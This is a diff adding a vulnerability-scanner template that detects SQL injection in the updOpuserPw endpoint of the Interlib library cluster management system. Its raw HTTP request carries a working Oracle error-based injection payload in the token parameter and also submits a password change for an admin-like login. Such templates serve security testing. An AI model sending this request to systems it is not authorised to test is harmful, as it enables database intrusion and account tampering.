@@ -1,0 +1,31 @@
+id: poc-yaml-guangzhou-tuchuang-updopuserpw-sqli
+info:
+  name: 广州图创 图书馆集群管理系统 updOpuserPw SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects an SQL injection vulnerability in the 广州图创 图书馆集群管理系统 (Interlib Library Cluster Management System) in the updOpuserPw endpoint.
+
+variables:
+  t1: '{{rand_int(1000, 10000)}}'
+  t2: '{{to_number(t1) * 111}}'
+
+http:
+  - raw:
+      - |
+        GET /interlib3/service/sysop/updOpuserPw?loginid=admin11&newpassword=Aa@123456&token=1%27and+ctxsys.drithsx.sn(1,(select%20{{t1}}*111%20from%20dual))=%272 HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "java.sql.SQLException"
+          - "Oracle Text"
+      - type: dsl
+        dsl:
+          - contains(body, t2)
+      - type: status
+        status:
+          - 200
